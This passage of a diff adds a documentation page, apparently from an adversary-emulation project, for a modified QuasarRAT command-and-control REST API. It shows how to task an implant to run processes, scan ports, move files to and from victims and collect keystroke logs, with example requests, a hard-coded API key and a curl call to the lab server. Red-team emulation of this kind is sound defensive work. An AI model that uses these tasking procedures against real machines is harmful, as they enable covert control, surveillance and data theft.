+<li><code v-pre>use_shell</code>: (optional) boolean indicating whether or not to use the operating system shell to start the process. Default is <code v-pre>false</code>. For more information, please refer to the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=netframework-4.7.2" class="outbound" target="_blank"><span>Microsoft documentation</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li><code v-pre>get_output</code>: (optional) boolean indicating whether or not to wait for the implant to wait for the process to complete and send stdout/stderr to the server. Default is <code v-pre>true</code>. Cannot be enabled if <code v-pre>use_shell</code> is also set to true - the server will set <code v-pre>get_output</code> to false if both are enabled. Note that the implant will wait for process completion in a separate thread in order to handle multiple tasks in parallel.</li>
+<li><code v-pre>no_window</code>: (optional) boolean indicating whether or not to start the process in a new window. Default is <code v-pre>true</code>. Note that some processes, such as <code v-pre>notepad.exe</code> will appear in a new window regardless. Mainly used to prevent command-line executables such as <code v-pre>hostname.exe</code> from briefly flashing a new window on execution.</li>
+</ul>
+<p>For <code v-pre>GET /api/tasks/{task_id}</code> requests pertaining to a process creation task, the response dictionary will contain the following fields in addition to the base response fields and the fields/values from the request dictionary:</p>
+<ul>
+<li><code v-pre>pid</code>: int representing the process ID of the created process. Will be <code v-pre>-1</code> if the task hasn&#x27;t yet completed, since the implant sends this information to the C2 server.</li>
+<li><code v-pre>exit_code</code>: int representing the exit code of the created process. Will be <code v-pre>-1</code> if the process hasn&#x27;t yet finished. Only populated if <code v-pre>get_output</code> was set to true.</li>
+<li><code v-pre>stdout</code>: string representing the standard output of the process. Will be empty if the process hasn&#x27;t yet finished. Only populated if <code v-pre>get_output</code> was set to true.</li>
+<li><code v-pre>stderr</code>: string representing the standard error of the process. Will be empty if the process hasn&#x27;t yet finished. Only populated if <code v-pre>get_output</code> was set to true.</li>
+</ul>
+<p>Examples:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">## Process creation with args, not yet completed.
+# POST /api/tasks 
+# POST data: '{&quot;client_id&quot;: &quot;0B4C114149C3E9A6CBEE590B72F08D4E&quot;, &quot;task_type&quot;: 1, &quot;proc_path&quot;: &quot;whoami.exe&quot;, &quot;proc_args&quot;: &quot;/all&quot; }'
+{
+    &quot;task_id&quot;: &quot;caedfd24-2078-42b6-9a7e-e8724173073a&quot;,
+    &quot;task_type&quot;: 1,
+    &quot;task_status&quot;: 2,
+    &quot;task_status_msg&quot;: &quot;&quot;,
+    &quot;proc_path&quot;: &quot;whoami.exe&quot;,
+    &quot;proc_args&quot;: &quot;/all&quot;,
+    &quot;download_url&quot;: &quot;&quot;,
+    &quot;download_dst&quot;: &quot;&quot;,
+    &quot;use_shell&quot;: false,
+    &quot;get_output&quot;: true,
+    &quot;no_window&quot;: true,
+    &quot;pid&quot;: -1,
+    &quot;exit_code&quot;: -1,
+    &quot;stdout&quot;: &quot;&quot;,
+    &quot;stderr&quot;: &quot;&quot;
+}
+
+## Task info for a completed task with stdout
+# GET /api/tasks/{task_id}
+{
+    &quot;task_id&quot;: &quot;97bfb33b-d16b-4c06-92dc-95086b618e4a&quot;,
+    &quot;task_type&quot;: 1,
+    &quot;task_status&quot;: 0,
+    &quot;task_status_msg&quot;: &quot;&quot;,
+    &quot;proc_path&quot;: &quot;hostname.exe&quot;,
+    &quot;proc_args&quot;: &quot;&quot;,
+    &quot;download_url&quot;: &quot;&quot;,
+    &quot;download_dst&quot;: &quot;&quot;,
+    &quot;use_shell&quot;: false,
+    &quot;get_output&quot;: true,
+    &quot;no_window&quot;: true,
+    &quot;pid&quot;: 27356,
+    &quot;exit_code&quot;: 0,
+    &quot;stdout&quot;: &quot;dummyhostname\n&quot;,
+    &quot;stderr&quot;: &quot;&quot;
+}
+
+## Task info for a completed task with stderr
+# GET /api/tasks/{task_id}
+{
+    &quot;task_id&quot;: &quot;6af38b85-6179-4859-8452-f7d016cf41e6&quot;,
+    &quot;task_type&quot;: 1,
+    &quot;task_status&quot;: 0,
+    &quot;task_status_msg&quot;: &quot;&quot;,
+    &quot;proc_path&quot;: &quot;net.exe&quot;,
+    &quot;proc_args&quot;: &quot;&quot;,
+    &quot;download_url&quot;: &quot;&quot;,
+    &quot;download_dst&quot;: &quot;&quot;,
+    &quot;use_shell&quot;: false,
+    &quot;get_output&quot;: true,
+    &quot;no_window&quot;: true,
+    &quot;pid&quot;: 23616,
+    &quot;exit_code&quot;: 1,
+    &quot;stdout&quot;: &quot;&quot;,
+    &quot;stderr&quot;: &quot;The syntax of this command is:\nNET\n    [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |\n      HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START |\n      STATISTICS | STOP | TIME | USE | USER | VIEW ]\n&quot;
+}
+
+## Task info for an executed process without waiting for completion
+# GET /api/tasks/{task_id}
+{
+    &quot;task_id&quot;: &quot;03001dad-1d0d-4814-b6d1-70cf44b82246&quot;,
+    &quot;task_type&quot;: 1,
+    &quot;task_status&quot;: 0,
+    &quot;task_status_msg&quot;: &quot;&quot;,
+    &quot;proc_path&quot;: &quot;notepad.exe&quot;,
+    &quot;proc_args&quot;: &quot;&quot;,
+    &quot;download_url&quot;: &quot;&quot;,
+    &quot;download_dst&quot;: &quot;&quot;,
+    &quot;use_shell&quot;: false,
+    &quot;get_output&quot;: false,
+    &quot;no_window&quot;: true,
+    &quot;pid&quot;: 11740,
+    &quot;exit_code&quot;: -1,
+    &quot;stdout&quot;: &quot;&quot;,
+    &quot;stderr&quot;: &quot;&quot;
+}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="port-scan-tasks">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#port-scan-tasks">#</doc-anchor-trigger>
+        <span>Port Scan Tasks</span>
+    </h3>
+</doc-anchor-target>
+<p>For port scan tasks (<code v-pre>task_type</code> of <code v-pre>5</code>), include the following fields in the POST JSON dictionary:</p>
+<ul>
+<li><code v-pre>range</code>: string containing a valid CIDR range (e.g. <code v-pre>10.1.2.0/24</code>) to scan</li>
+<li><code v-pre>ports</code>: int array containing the ports to scan the target <code v-pre>range</code> for</li>
+</ul>
+<p>For <code v-pre>GET /api/tasks/{task_id}</code> requests pertaining to a process creation task, the response dictionary will contain the following fields in addition to the base response fields and the fields/values from the request dictionary:</p>
+<ul>
+<li><code v-pre>range</code>: CIDR string for the scanned network</li>
+<li><code v-pre>ports</code>: int array containing the scanned ports</li>
+<li><code v-pre>result</code>: dictionary mapping IP address string to int array of open ports based on the provided target <code v-pre>ports</code> to scan.</li>
+</ul>
+<p>Examples:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">## Task port scan
+# POST /api/tasks 
+# POST data: '{&quot;client_id&quot;: &quot;5CEF61CF22ACA6F40918643E3AAA0772&quot;, &quot;task_type&quot;: 5, &quot;range&quot;: &quot;10.0.2.9/28&quot;, &quot;ports&quot;: [8888,3389]}'
+{
+    &quot;task_id&quot;: &quot;c875ed5d-07a0-46ac-b031-a6865330197a&quot;,
+    &quot;task_type&quot;: 5,
+    &quot;task_status&quot;: 2,
+    &quot;task_status_msg&quot;: &quot;&quot;,
+    &quot;range&quot;: &quot;10.0.2.9/28&quot;,
+    &quot;ports&quot;: [
+        8888,
+        3389
+    ],
+    &quot;result&quot;: {}
+}
+
+## Task info for a completed port scan
+# GET /api/tasks/{task_id}
+{
+    &quot;task_id&quot;: &quot;c875ed5d-07a0-46ac-b031-a6865330197a&quot;,
+    &quot;task_type&quot;: 5,
+    &quot;task_status&quot;: 0,
+    &quot;task_status_msg&quot;: &quot;&quot;,
+    &quot;range&quot;: &quot;10.0.2.9/28&quot;,
+    &quot;ports&quot;: [
+        8888,
+        3389
+    ],
+    &quot;result&quot;: {
+        &quot;10.0.2.4&quot;: [
+            3389
+        ],
+        &quot;10.0.2.5&quot;: [
+            3389
+        ],
+        &quot;10.0.2.7&quot;: [
+            3389
+        ],
+        &quot;10.0.2.8&quot;: [
+            3389
+        ],
+        &quot;10.0.2.9&quot;: [
+            8888,
+            3389
+        ],
+        &quot;10.0.2.10&quot;: [
+            3389
+        ],
+        &quot;10.0.2.11&quot;: [
+            3389
+        ],
+        &quot;10.0.2.12&quot;: [
+            3389
+        ],
+        &quot;10.0.2.13&quot;: [
+            3389
+        ],
+        &quot;10.0.2.14&quot;: [
+            3389
+        ],
+        &quot;10.0.2.15&quot;: [
+            3389
+        ]
+    }
+}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="file-downloads-and-uploads">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#file-downloads-and-uploads">#</doc-anchor-trigger>
+        <span>File Downloads and Uploads</span>
+    </h3>
+</doc-anchor-target>
+<p><code v-pre>GET /api/transfers</code> - fetch a JSON list of all file transfers throughout the Quasar server session. The return format for a Quasar file transfer
+dictionary is as follows:</p>
+<ul>
+<li><code v-pre>id</code>: the transfer&#x27;s unique ID</li>
+<li><code v-pre>type</code>: transfer type. <code v-pre>0</code> for server-to-client, <code v-pre>1</code> for client-to-server</li>
+<li><code v-pre>size</code>: size, in bytes, of file transferred.</li>
+<li><code v-pre>transferred_size</code>: number of bytes transferred so far</li>
+<li><code v-pre>local_path</code>: file source path</li>
+<li><code v-pre>remote_path</code>: file destination path</li>
+<li><code v-pre>status_msg</code>: Status message for the file transfer (e.g. <code v-pre>Completed</code>)</li>
+<li><code v-pre>status</code>: integer status code for the file transfer:
+<ul>
+<li><code v-pre>0</code>: completed successfully</li>
+<li><code v-pre>1</code>: ran into an error</li>
+<li><code v-pre>2</code>: pending</li>
+<li><code v-pre>3</code>: canceled</li>
+</ul>
+</li>
+</ul>
+<p><code v-pre>GET /api/transfers/{transfer_id}</code> - fetch a JSON dictionary containing information for the Quasar file transfer pertaining to the given <code v-pre>transfer_id</code></p>
+<p><code v-pre>POST /api/transfers</code> - create a file transfer task by POSTing a JSON dictionary with the following fields:</p>
+<ul>
+<li><code v-pre>client_id</code>: string containing the ID of the Quasar implant to task</li>
+<li><code v-pre>type</code>: int representing the transfer type. 0 for server-to-client, 1 for client-to-server</li>
+<li><code v-pre>source</code>: string representing the path of the source file to transfer. If performing a server-to-client transfer, this path must be a valid path on the Quasar server. If performing a client-to-server transfer, this path must exist on the target machine where the implant is running.</li>
+<li><code v-pre>dest</code>: string representing the filepath or filename to save the file as. If performing a server-to-client transfer, the file will be saved using the specified filepath on the target machine where the implant is running. If performing a client-to-server transfer, the file will be saved using the specified filename in the <code v-pre>uploads</code> subdirectory of the Quasar server&#x27;s current working directory. Optional for client-to-server transfers - if not provided, it will take the filename based on the <code v-pre>source</code> filepath.</li>
+</ul>
+<p><code v-pre>GET /api/uploadedfiles</code> - fetch a JSON dictionary mapping file upload transfer IDs to the saved file path on the Quasar server</p>
+<p><code v-pre>GET /api/uploadedfiles/{transfer_id}</code> - request the uploaded file pertaining to the given <code v-pre>transfer_id</code></p>
+<p>Examples:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># GET /api/transfers
+[
+    {
+        &quot;id&quot;: 1477877996,
+        &quot;type&quot;: 0,
+        &quot;size&quot;: 4821,
+        &quot;transferred_size&quot;: 4821,
+        &quot;local_path&quot;: &quot;C:\\Users\\testuser\\myfile.text&quot;,
+        &quot;remote_path&quot;: &quot;C:\\Users\\Public\\myfile.text&quot;,
+        &quot;status_msg&quot;: &quot;Completed&quot;,
+        &quot;status&quot;: 0
+    }
+]
+
+# GET /api/transfers/1477877996
+{
+    &quot;id&quot;: 1477877996,
+    &quot;type&quot;: 0,
+    &quot;size&quot;: 4821,
+    &quot;transferred_size&quot;: 4821,
+    &quot;local_path&quot;: &quot;C:\\Users\\testuser\\myfile.text&quot;,
+    &quot;remote_path&quot;: &quot;C:\\Users\\Public\\myfile.text&quot;,
+    &quot;status_msg&quot;: &quot;Completed&quot;,
+    &quot;status&quot;: 0
+}
+
+# GET /api/uploadedfiles
+{
+    &quot;1438023322&quot;: &quot;C:\\Users\\testuser\\path\\to\\uploaded\\file.txt&quot;,
+    &quot;1098610208&quot;: &quot;C:\\Users\\testuser\\path\\to\\uploaded\\file.log&quot;
+}
+
+## client-to-server transfer
+# POST /api/transfers
+# POST data: '{&quot;client_id&quot;: &quot;0B4C114149C3E9A6CBEE590B72F08D4E&quot;, &quot;type&quot;: 1, &quot;source&quot;: &quot;C:\\Users\\Public\\cleanup.ps1&quot;, &quot;dest&quot;: &quot;transfer.ps1&quot; }'
+{
+    &quot;id&quot;: 356532246,
+    &quot;type&quot;: 1,
+    &quot;size&quot;: 0,
+    &quot;transferred_size&quot;: 0,
+    &quot;local_path&quot;: &quot;C:\\Users\\testuser\\Quasar\\uploads\\transfer.ps1&quot;,
+    &quot;remote_path&quot;: &quot;C:\\Users\\Public\\cleanup.ps1&quot;,
+    &quot;status_msg&quot;: &quot;Pending...&quot;,
+    &quot;status&quot;: 2
+}
+
+## Server to client transfer
+# POST /api/transfers 
+# POST data: '{&quot;client_id&quot;: &quot;0B4C114149C3E9A6CBEE590B72F08D4E&quot;, &quot;type&quot;: 0, &quot;source&quot;: &quot;C:\\Windows\\System32\\notepad.exe&quot;, &quot;dest&quot;: &quot;C:\\Users\\Public\\npcopy.exe&quot; }'
+{
+    &quot;id&quot;: 310008463,
+    &quot;type&quot;: 0,
+    &quot;size&quot;: 201216,
+    &quot;transferred_size&quot;: 0,
+    &quot;local_path&quot;: &quot;C:\\Windows\\System32\\notepad.exe&quot;,
+    &quot;remote_path&quot;: &quot;C:\\Users\\Public\\npcopy.exe&quot;,
+    &quot;status_msg&quot;: &quot;Pending...&quot;,
+    &quot;status&quot;: 2
+}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="keystroke-log-uploads">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#keystroke-log-uploads">#</doc-anchor-trigger>
+        <span>Keystroke Log Uploads</span>
+    </h4>
+</doc-anchor-target>
+<p>While <code v-pre>/api/transfers</code> is for generic file uploads and downloads, you can use the <code v-pre>/api/transfers/keylogger</code> endpoint to manage keystroke log uploads, which is a special type of file upload task for QuasarRat.
+The Quasar server will task the Quasar client to enumerate all files within its keystroke log directory, and the Quasar server will then generate individual file transfer tasks for each of those keystroke log files.
+Keystroke log files are uploaded to the <code v-pre>uploads/logged_keystrokes/{client_id}</code> subdirectory of the Quasar server&#x27;s current working directory, where <code v-pre>client_id</code> is the ID string of the client that uploaded the files.
+For instance, keystroke log uploads for client <code v-pre>5CEF61CF22ACA6F40918643E3AAA0772</code> will go to <code v-pre>uploads\logged_keystrokes\5CEF61CF22ACA6F40918643E3AAA0772</code>.</p>
+<p><code v-pre>POST /api/transfers/keylogger</code> - create a file transfer task by POSTing a JSON dictionary with the following fields:</p>
+<ul>
+<li><code v-pre>client_id</code>: string containing the ID of the Quasar implant to task</li>
+</ul>
+<p><code v-pre>GET /api/transfers/keylogger/{task_id}</code> - returns a JSON dictionary containing information on the keystroke log upload task with ID <code v-pre>task_id</code>. The dictionary will contain the following fields:</p>
+<ul>
+<li><code v-pre>task_id</code>: Task ID string</li>
+<li><code v-pre>status</code>: integer status code for the upload task:
+<ul>
+<li><code v-pre>0</code>: completed successfully</li>
+<li><code v-pre>1</code>: ran into an error</li>
+<li><code v-pre>2</code>: pending</li>
+<li><code v-pre>3</code>: canceled</li>
+<li><code v-pre>4</code>: partial success (some logs failed to upload)</li>
+<li><code v-pre>5</code>: pending incomplete (unable to generate file transfers for some log files, other log files still in progress)</li>
+</ul>
+</li>
+<li><code v-pre>status_msg</code>: Status message for the upload task (e.g. <code v-pre>Successfully retrieved all logs</code>)</li>
+<li><code v-pre>status_err_msg</code>: Status error message providing more context on non-success error codes.</li>
+<li><code v-pre>transfer_ids</code>: list of integers representing the file transfer IDs for the keystroke log files being uploaded. These can be queried via <code v-pre>GET /api/transfers/{transfer_id}</code> for individual transfer information.</li>
+</ul>
+<p>Examples:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># GET /api/transfers/keylogger/{task_id}
+{
+    &quot;task_id&quot;: &quot;fb76942c-9f28-4c0d-ab5a-7b4b5858fdb9&quot;,
+    &quot;status&quot;: 0,
+    &quot;status_msg&quot;: &quot;Successfully retrieved all logs&quot;,
+    &quot;status_err_msg&quot;: &quot;&quot;,
+    &quot;transfer_ids&quot;: [
+        521350519
+    ]
+}
+
+# POST /api/transfers/keylogger
+# POST data: '{&quot;client_id&quot;: &quot;5CEF61CF22ACA6F40918643E3AAA0772&quot;}'
+{
+    &quot;task_id&quot;: &quot;3b2a0ccb-d3fc-492e-a65b-ccd93606353d&quot;,
+    &quot;status&quot;: 2,
+    &quot;status_msg&quot;: &quot;&quot;,
+    &quot;status_err_msg&quot;: &quot;&quot;,
+    &quot;transfer_ids&quot;: []
+}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="authentication">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#authentication">#</doc-anchor-trigger>
+        <span>Authentication</span>
+    </h3>
+</doc-anchor-target>
+<p>All REST API requests must have an <code v-pre>APIKEY</code> header with the following API key string value: <code v-pre>81152cc4c24d327f8fe800afbfb9777c</code>.
+Incorrect or missing API keys will result in a <code v-pre>401 Unauthorized.</code> response from the REST API server.
+This authentication method is set to prevent other parties from sending queries to the Quasar REST API server to obtain
+information on red team activity.</p>
+<p>Example curl commands with the API key:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">curl -s -H &quot;APIKEY:81152cc4c24d327f8fe800afbfb9777c&quot; http://10.0.2.9:8888/api/beacons</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="build-1">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#build-1">#</doc-anchor-trigger>
+        <span>Build</span>
+    </h2>
+</doc-anchor-target>
+<p>Built using Msbuild and .NET 4.7.2 (use release configuration for static builds):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">MSBuild.exe Quasar.sln /t:Build /p:Configuration=Release</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../managedservices/menupass/resources/setup/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">menu​Pass Setup Procedure</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../managedservices/menupass/resources/sigloader/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Sig​Loader Capability</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Quasar (Modified)", level: 4, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
